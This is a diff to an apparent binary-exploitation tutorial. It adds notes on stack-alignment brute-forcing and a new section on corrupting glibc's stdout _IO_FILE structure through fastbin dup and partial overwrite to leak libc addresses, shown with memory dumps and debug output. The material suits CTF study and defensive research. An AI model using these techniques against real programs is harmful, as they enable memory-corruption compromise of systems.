@@ -236,6 +236,14 @@ to the last 12 bits of a static offset and try to get the target address
 For example: you can rewrite 1 byte of an address and you don't know the
 address at the return address or address from .got section or something else.
 
+BUT! If you are working with stack's addresses (no code/heap/libc/ld) 
+you probably will be faced with arch_align_stack().
+It means that process also put randowm offset from base of stack to make
+stack more protective. So, you need bruteforce 1/16 to reach your payload via leave & ret
+if you can control saved rbp with off-by-one or smth else.
+You should also do care about environment of process at argv** & envp** because they's
+values put into the stack and move rsp upper. Just debug with the same environ ;)
+
 
 ================================================================================
 3. FORMAT STRING EXPLOITATION
@@ -868,7 +876,7 @@ It must be in range of special space among libc addresses.
 It means that we can't just overwrite vtable pointer to arbitrary address with fake vtable.
 All of these have become a cause of appearing of several following exploitation techniques.
 
-5.2 Vtable Protections Bypass
+5.3 Vtable Protections Bypass
 ------------------------------------------------------------------------------
 
 While glibc's absractions are having pointers to callbacks to next level of abstraction, hackers will find a way to pwn it.
@@ -912,7 +920,74 @@ While glibc's absractions are having pointers to callbacks to next level of abst
 	  All of what we need - shift address of _IO_str_jumps so that target event (for example __xputn) pulls __overflow callback.
 	  As we now, it will use "_allocate_buffer_unused" and "_IO_buf_end & _IO_buf_base" which we can control.
 	  But don't forget to substitute buf pointers to write_ptr >= write_base to trigger "_allocate_buffer_unused" or try to do "honest" overflow.
+	  
+5.4 Manipulations with stdout _IO_FILE struct to reach arbitrary read
+------------------------------------------------------------------------------
 
+As you can see at 5.1 _IO_FILE has a lot of fields such as flags, pointers, mutex etc.
+If we can control _IO_2_1_stdout_ structure we can get arbitrary read primitive via write_base / write_ptr and flags manip.
+
+It means that we literally say : "If any function which uses stdout will be called - first of all 
+append to stdout all data between write_base and write_ptr addresses".
+
+This tricky blind-attack can be used if you haven't another easier method to leak addresses but you have following conditions :
+
+	1. Arbitrary write 
+	2. Having libc address near the _IO_2_1_stdout_
+	3. Partial overwrite 1-2 bytes
+	
+Let me show you an example :
+
+	Layout before overwriting : 
+	
+		0x7ffff7bc45e0 <_IO_2_1_stderr_+160>:   0x00007ffff7bc3660      0x0000000000000000
+		0x7ffff7bc45f0 <_IO_2_1_stderr_+176>:   0x0000000000000000      0x0000000000000000
+		0x7ffff7bc4600 <_IO_2_1_stderr_+192>:   0x0000000000000000      0x0000000000000000
+		0x7ffff7bc4610 <_IO_2_1_stderr_+208>:   0x0000000000000000      0x00007ffff7bc26e0
+		0x7ffff7bc4620 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007ffff7bc46a3
+		0x7ffff7bc4630 <_IO_2_1_stdout_+16>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
+		0x7ffff7bc4640 <_IO_2_1_stdout_+32>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
+		0x7ffff7bc4650 <_IO_2_1_stdout_+48>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
+		0x7ffff7bc4660 <_IO_2_1_stdout_+64>:    0x00007ffff7bc46a4      0x0000000000000000
+		0x7ffff7bc4660 <_IO_2_1_stdout_+64>:    0x00007ffff7bc46a4      0x0000000000000000
+		0x7ffff7bc4670 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
+		0x7ffff7bc4680 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffff7bc38e0
+
+	At 0x7ffff7bc4640 we have write_base and at 0x7ffff7bc4648 write_ptr
+	So, as arbitrary write you can use fastbin dup and do allocation to 0x7ffff7bc4610 - 0x33 (or anything another way which you can do)
+	
+		0x7ffff7bc45dd <_IO_2_1_stderr_+157>:   0xfff7bc3660000000      0x000000000000007f
+		0x7ffff7bc45ed <_IO_2_1_stderr_+173>:   0x0000000000000000      0x0000000000000000
+		0x7ffff7bc45fd <_IO_2_1_stderr_+189>:   0x0000000000000000      0x0000000000000000
+		0x7ffff7bc460d <_IO_2_1_stderr_+205>:   0x0000000000000000      0xfff7bc26e0000000
+		0x7ffff7bc461d <_IO_2_1_stderr_+221>:   0x00fbad288700007f      0xfff7bc46a3000000
+	
+	Now (if we wanna get libc leak) we interested at overwrite flags with _IO_IS_APPENDING & _IO_CURRENTLY_PUTTING and write_ptr to any address which includes libc address
+	As you can see, now the statement of stdout is : "print bytes from 0x7ffff7bc46a3 to 0x7ffff7bc46a3"
+	But we'll turn it into : "print bytes from <addr> to 0x7ffff7bc46a3 immediately when stdout will be used"
+	And because this attack is blind we'll do the partial overwrite at the 0x7ffff7bc4640 with 1 bytes
+	For example 0x20 to print all _IO_2_1_stdout_ data where we can leak 0x00007ffff7bc46a3 ptrs from libc 
+	or steal stdin address from __chain field at 0x7ffff7bc4688.
+	
+	And this is the layour after overwriting :
+	
+		0x7ffff7bc4620 <_IO_2_1_stdout_>:       0x00000000fbad1887      0x0000000000000000
+		0x7ffff7bc4630 <_IO_2_1_stdout_+16>:    0x0000000000000000      0x0000000000000000
+		0x7ffff7bc4640 <_IO_2_1_stdout_+32>:    0x00007ffff7bc4688      0x00007ffff7bc46a3
+		0x7ffff7bc4650 <_IO_2_1_stdout_+48>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
+		0x7ffff7bc4660 <_IO_2_1_stdout_+64>:    0x00007ffff7bc46a4      0x0000000000000000
+		0x7ffff7bc4670 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
+		0x7ffff7bc4680 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffff7bc38e0
+		
+	I decided put the __chain address immediately to get stdin address at first 8 bytes od output :
+	
+		[DEBUG] Received 0xce bytes:
+		    00000000  e0 38 bc f7  ff 7f 00 00  01 00 00 00  00 00 00 00  │·8··│····│····│····│
+		    00000010  ff ff ff ff  ff ff ff ff  00 00 00 2a  2a 2a 2a 2a  │····│····│···*│****│
+		    
+	Well done. And now we can calculate libc base to continue compromise chain.
+	
+	
 ================================================================================
 6. BONUS
 ================================================================================
@@ -1469,9 +1544,9 @@ Let me show example at FSOP context:
 		0x555555a021d0: 0x00007ffff7bc46bd      0x0000000000000000
 					...
 		0x555555a02260: 0x0000000000000000      0x0000000000000071
-		0x555555a02270: 0x0000555555a02161      0x0000000000000000
+		0x555555a02270: 0x0000555555a021c0      0x0000000000000000
 	
-	The next malloc( <0x60 - 0x68> ) returns 0x7ffff7bc46cd which will help us to overwrite vtable pointer of stdout.
+	The next (3rd after fd overwrite) malloc( <0x60 - 0x68> ) returns 0x7ffff7bc46cd which will help us to overwrite vtable pointer of stdout.
 	
 6.12 Unaligned malloc size to potentially off-by-one
 ------------------------------------------------------------------------------
